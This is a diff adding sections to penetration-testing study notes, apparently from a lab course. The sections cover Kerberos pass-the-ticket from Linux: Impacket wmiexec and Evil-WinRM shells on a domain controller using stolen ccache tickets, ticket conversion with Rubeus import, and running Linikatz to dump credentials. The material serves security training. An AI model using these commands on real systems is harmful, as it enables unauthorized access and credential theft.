@@ -5095,7 +5095,7 @@ whoami
 
 As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.
 
-**Confirm Current User**
+**Confirm current user**
 
 ```bash
 ls -la /tmp
@@ -5314,15 +5314,318 @@ export KRB5CCNAME=/home/<USER>/krb5cc_647401106_I8I133
 
 ---
 
+<details>
+<summary><h5>Impacket</h5></summary>
+
+To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option -no-pass.
+
+**Use Impacket with proxychains and Kerberos authentication**
+
+```bash
+proxychains impacket-wmiexec dc01 -k
+```
+
+**Expected Output**
+
+```bash
+# [proxychains] config file found: /etc/proxychains.conf
+# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+# [proxychains] DLL init: proxychains-ng 4.14
+# Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  <DOMAIN>:88  ...  OK
+# [*] SMBv3.0 dialect used
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  <DOMAIN>:88  ...  OK
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:50713  ...  OK
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  <DOMAIN>:88  ...  OK
+# [!] Launching semi-interactive shell - Careful what you execute
+# [!] Press help for extra shell commands
+```
+
+**Confirm current user**
+
+```cmd
+whoami
+```
+
+**Expected Output**
+
+```cmd
+<DOMAIN>\julio
+```
+
+> **Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.
+
+</details>
+
+<details>
+<summary><h5>Evil-WinRM</h5></summary>
+
+To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`. While installing, we'll get a prompt for the Kerberos realm. Use the domain name, and the KDC is the DC01.
+
+**Install Kerberos authentication package**
+
+```bash
+sudo apt-get install krb5-user -y
+```
+
+In case the package krb5-user is already installed, we need to change the configuration file /etc/krb5.conf to include the following values:
+
+**Kerberos configuration file:**
+
+
+```bash
+# [libdefaults]
+#         default_realm = <DOMAIN>
+
+# ...
+
+# [realms]
+#     <DOMAIN> = {
+#         kdc = dc01.<DOMAIN>
+#     }
+
+# ...
+```
+
+**Use Evil-WinRM with Kerberos**
+
+```bash
+proxychains evil-winrm -i dc01 -r <DOMAIN>
+```
+
+**Expected Output**
+
+```bash
+# [proxychains] config file found: /etc/proxychains.conf
+# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+# [proxychains] DLL init: proxychains-ng 4.14
+
+# Evil-WinRM shell v3.3
+# ...
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:5985  ...  OK
+```
+
+**Confirm current user**
+
+```powershell
+*Evil-WinRM* PS C:\Users\julio\Documents> whoami
+```
+
+**Expected Output**
+
+```powershell
+<DOMAIN>\julio
+```
+
+**Confirm current host**
+
+```powershell
+*Evil-WinRM* PS C:\Users\julio\Documents> hostname
+```
+
+**Expected Output**
+
+```powershell
+DC01
+```
+
+</details>
+
 </details>
 
 <details>
 <summary><h4>Miscellaneous</h4></summary>
 
+If we want to use a ccache file in Windows or a kirbi file in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.
+
+**Convert ccache to kirbi (Linux → Windows)**
+
+```bash
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+```
+
+**Expected Output:**
+
+```bash
+# Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+# [*] converting ccache to kirbi...
+# [+] done
+```
+
+**Import kirbi Ticket in Windows Session (Windows-CMD)**
+
+```cmd
+C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+```
+
+**Expected Output**
+
+```bash
+#    ______        _
+#   (_____ \      | |
+#    _____) )_   _| |__  _____ _   _  ___
+#   |  __  /| | | |  _ \| ___ | | | |/___)
+#   | |  \ \| |_| | |_) ) ____| |_| |___ |
+#   |_|   |_|____/|____/|_____)____/(___/
+
+#   v2.1.2
+
+
+# [*] Action: Import Ticket
+# [+] Ticket successfully imported!
+```
+
+**TITLE**
+
+```cmd
+klist
+```
+
+**Expected Output**
+
+```bash
+# Current LogonId is 0:0x31adf02
+
+# Cached Tickets: (1)
+
+# #0>     Client: julio @ <DOMAIN>
+#         Server: krbtgt/<DOMAIN> @ <DOMAIN>
+#         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+#         Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
+#         Start Time: 10/10/2025 5:46:02 (local)
+#         End Time:   10/10/2025 15:46:02 (local)
+#         Renew Time: 10/11/2025 5:46:02 (local)
+#         Session Key Type: AES-256-CTS-HMAC-SHA1-96
+#         Cache Flags: 0x1 -> PRIMARY
+#         Kdc Called:
+
+```
+
+**TITLE**
+
+```cmd
+dir \\dc01\julio
+```
+
+**Expected Output**
+
+```bash
+#  Volume in drive \\dc01\julio has no label.
+#  Volume Serial Number is B8B3-0D72
+
+#  Directory of \\dc01\julio
+
+# 07/14/2025  07:25 AM    <DIR>          .
+# 07/14/2025  07:25 AM    <DIR>          ..
+# 07/14/2025  04:18 PM                17 julio.txt
+#                1 File(s)             17 bytes
+#                2 Dir(s)  18,161,782,784 bytes free
+```
+
 </details>
 
 <details>
 <summary><h4>Linikatz</h4></summary>
+
+[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a credential dumping tool developed by Cisco’s security team, designed to exploit Linux systems integrated with Active Directory. It brings the same concept as Mimikatz, but tailored for UNIX environments.
+
+Like Mimikatz, Linikatz requires root privileges to operate. Once executed, it extracts credentials—including Kerberos tickets—from various implementations such as FreeIPA, SSSD, Samba, and Vintella. The dumped credentials are stored in a folder prefixed with linikatz. and are available in multiple formats, including ccache and keytab.
+
+**Download Linikatz**
+
+```bash
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+```
+
+**Run Linikatz**
+
+```bash
+/opt/linikatz.sh
+```
+
+```bash
+#  _ _       _ _         _
+# | (_)_ __ (_) | ____ _| |_ ____
+# | | | '_ \| | |/ / _` | __|_  /
+# | | | | | | |   < (_| | |_ / /
+# |_|_|_| |_|_|_|\_\__,_|\__/___|
+
+#              =[ @timb_machine ]=
+
+# I: [freeipa-check] FreeIPA AD configuration
+# -rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
+# -rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
+# -rw-r--r-- 1 root root 1702 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Hughski-Limited
+# -rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd/LVFS-CA.pem
+# -rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
+# -rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
+# -rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd-metadata/LVFS-CA.pem
+# I: [sss-check] SSS AD configuration
+# -rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/timestamps_<DOMAIN>.ldb
+# -rw------- 1 root root 1286144 Oct  7 12:17 /var/lib/sss/db/config.ldb
+# -rw------- 1 root root 4154 Oct 10 19:48 /var/lib/sss/db/ccache_<DOMAIN>
+# -rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/cache_<DOMAIN>.ldb
+# -rw------- 1 root root 1286144 Oct  4 16:26 /var/lib/sss/db/sssd.ldb
+# -rw-rw-r-- 1 root root 10406312 Oct 10 19:54 /var/lib/sss/mc/initgroups
+# -rw-rw-r-- 1 root root 6406312 Oct 10 19:55 /var/lib/sss/mc/group
+# -rw-rw-r-- 1 root root 8406312 Oct 10 19:53 /var/lib/sss/mc/passwd
+# -rw-r--r-- 1 root root 113 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
+# -rw-r--r-- 1 root root 40 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
+# -rw-r--r-- 1 root root 15 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
+# -rw-r--r-- 1 root root 12 Oct 10 19:55 /var/lib/sss/pubconf/kdcinfo.<DOMAIN>
+# -rw------- 1 root root 504 Oct  6 11:16 /etc/sssd/sssd.conf
+# I: [vintella-check] VAS AD configuration
+# I: [pbis-check] PBIS AD configuration
+# I: [samba-check] Samba configuration
+# -rw-r--r-- 1 root root 8942 Oct  4 16:25 /etc/samba/smb.conf
+# -rw-r--r-- 1 root root 8 Jul 18 12:52 /etc/samba/gdbcommands
+# I: [kerberos-check] Kerberos configuration
+# -rw-r--r-- 1 root root 2800 Oct  7 12:17 /etc/krb5.conf
+# -rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
+# -rw------- 1 julio@<DOMAIN> domain users@<DOMAIN> 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
+# -rw------- 1 julio@<DOMAIN> domain users@<DOMAIN> 1414 Oct 10 19:55 /tmp/krb5cc_647401106_R9a9hG
+# -rw------- 1 carlos@<DOMAIN> domain users@<DOMAIN> 3175 Oct 10 19:55 /tmp/krb5cc_647402606
+# I: [samba-check] Samba machine secrets
+# I: [samba-check] Samba hashes
+# I: [check] Cached hashes
+# I: [sss-check] SSS hashes
+# I: [check] Machine Kerberos tickets
+# I: [sss-check] SSS ticket list
+# Ticket cache: FILE:/var/lib/sss/db/ccache_<DOMAIN>
+# Default principal: LINUX01$@<DOMAIN>
+
+# Valid starting       Expires              Service principal
+# 10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/<DOMAIN>@<DOMAIN>
+#     renew until 10/11/2022 19:48:03, Flags: RIA
+#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+# I: [kerberos-check] User Kerberos tickets
+# Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
+# Default principal: julio@<DOMAIN>
+
+# Valid starting       Expires              Service principal
+# 10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/<DOMAIN>@<DOMAIN>
+#     renew until 10/08/2022 11:32:01, Flags: FPRIA
+#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+# Ticket cache: FILE:/tmp/krb5cc_647401106_R9a9hG
+# Default principal: julio@<DOMAIN>
+
+# Valid starting       Expires              Service principal
+# 10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/<DOMAIN>@<DOMAIN>
+#     renew until 10/11/2022 19:55:02, Flags: FPRIA
+#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+# Ticket cache: FILE:/tmp/krb5cc_647402606
+# Default principal: svc_workstations@<DOMAIN>
+
+# Valid starting       Expires              Service principal
+# 10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/<DOMAIN>@<DOMAIN>
+#     renew until 10/11/2022 19:55:02, Flags: FPRIA
+#     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+# I: [check] KCM Kerberos tickets
+```
 
 </details>
 
